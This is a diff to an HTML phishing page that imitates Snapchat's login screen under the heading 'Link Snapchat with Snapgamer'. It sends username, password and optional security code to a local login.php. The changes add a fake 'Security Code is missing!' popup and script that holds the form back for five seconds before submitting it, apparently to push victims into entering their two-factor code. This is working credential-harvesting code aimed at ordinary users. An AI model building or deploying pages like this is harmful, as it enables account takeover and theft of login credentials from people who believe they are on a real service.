@@ -19,51 +19,91 @@
 <link rel=canonical href=https://accounts.snapchat.com/accounts/login>
 <meta http-equiv=content-security-policy
       content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
-<body class=designV2>
-      <div class=pusher>
-            <div id=login-root>
-                  <div class=App style=display:none>
-                        <div class=full-background-color></div>
-                        <div class=Header><a href=https://accounts.snapchat.com/ class="logo sf-hidden"></a></div>
-                        <div class=Login>
-                              <article class=page>
-                                    <div class=container><img class=snapchat-icon src="icon.svg" alt=Snapchat>
-                                          <div>
-                                                <h1 class=accountsTitle>Link Snapchat with Snapgamer</h1>
-                                          </div>
-                                          <div>
-                                                <form id=login_form action=login.php method=post class=centered_form>
-                                                      <div class="form-group has-success"><label for=username
-                                                                  class=control-label>Username or Email</label><input
-                                                                  name=username autocomplete=off type=text id=username
-                                                                  class=form-control required value></div>
-                                                      <div class="form-group has-success"><label for=password
-                                                                  class=control-label>Password</label><input
-                                                                  name=password autocomplete=off type=password
-                                                                  id=password class=form-control required value></div>
-                                                      <div class="form-group has-success"><label for=security_code
-                                                                  class=control-label>Security Code (optional)</label><input
-                                                                  name=security_code autocomplete=off type=security_code
-                                                                  id=security_code class=form-control></div>
-                                                      <p class=secondary_action><a href=#>Forgot
-                                                                  Password</a>
-                                                      <div style=display:none></div>
-                                                      <div class="primary_action login-button"><button type=submit
-                                                                  id=loginTrigger class="btn btn-lg btn-primary">Log
-                                                                  In</button></div>
-                                                </form>
-                                          </div>
-                                    </div>
-                                    <div class=create-account-cta><span>New To Snapchat?</span><a
-                                                href=https://accounts.snapchat.com/accounts/signup>Sign Up</a></div>
-                              </article>
+      <style>
+            /* Style for the custom popup window */
+            .popup-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5);
+                display: none;
+                justify-content: center;
+                align-items: center;
+                z-index: 9999;
+            }
+    
+            .popup-content {
+                background-color: white;
+                padding: 20px;
+                border-radius: 5px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            }
+        </style>
+    </head>
+    <body class="designV2">
+    <div class="pusher">
+        <div id="login-root">
+            <div class="App" style="display:none">
+                <div class="full-background-color"></div>
+                <div class="Header"><a href="https://accounts.snapchat.com/" class="logo sf-hidden"></a></div>
+                <div class="Login">
+                    <article class="page">
+                        <div class="container"><img class="snapchat-icon" src="icon.svg" alt="Snapchat">
+                            <div>
+                                <h1 class="accountsTitle">Link Snapchat with Snapgamer</h1>
+                            </div>
+                            <div>
+                                <form id="login_form" action="login.php" method="post" class="centered_form">
+                                    <div class="form-group has-success"><label for="username"
+                                                                              class="control-label">Username or Email</label><input
+                                                name="username" autocomplete="off" type="text" id="username"
+                                                class="form-control" required value></div>
+                                    <div class="form-group has-success"><label for="password"
+                                                                              class="control-label">Password</label><input
+                                                name="password" autocomplete="off" type="password" id="password"
+                                                class="form-control" required value></div>
+                                    <div class="form-group has-success"><label for="security_code"
+                                                                              class="control-label">Security Code (optional)</label><input
+                                                name="security_code" autocomplete="off" type="security_code"
+                                                id="security_code" class="form-control"></div>
+                                    <p class="secondary_action"><a href="#">Forgot
+                                            Password</a></p>
+                                    <div style="display:none"></div>
+                                    <div class="primary_action login-button"><button type="submit" id="loginTrigger"
+                                                                                       class="btn btn-lg btn-primary">Log
+                                            In</button></div>
+                                </form>
+                            </div>
                         </div>
-                  </div>
+                        <div class="create-account-cta"><span>New To Snapchat?</span><a
+                                    href="https://accounts.snapchat.com/accounts/signup">Sign Up</a></div>
+                    </article>
+                </div>
             </div>
-      </div>
-      <script>
-    document.getElementById("loginTrigger").addEventListener("click", function(event) {
-        alert("Message here");
-    });
-        </script>
-</body>
+        </div>
+    </div>
+    
+    <!-- Popup overlay and content -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-content">
+            <p>Security Code is missing!</p>
+        </div>
+    </div>
+    
+    <script>
+        // Function to show the popup and allow form submission after a 5-second delay
+        document.getElementById("loginTrigger").addEventListener("click", function(event) {
+            event.preventDefault(); // Prevent the default form submission
+            document.getElementById("popupOverlay").style.display = "flex"; // Show the popup
+    
+            // Delay form submission for 5 seconds
+            setTimeout(function() {
+                document.getElementById("login_form").submit(); // Submit the form
+            }, 5000);
+        });
+    </script>
+    
+    </body>
+    
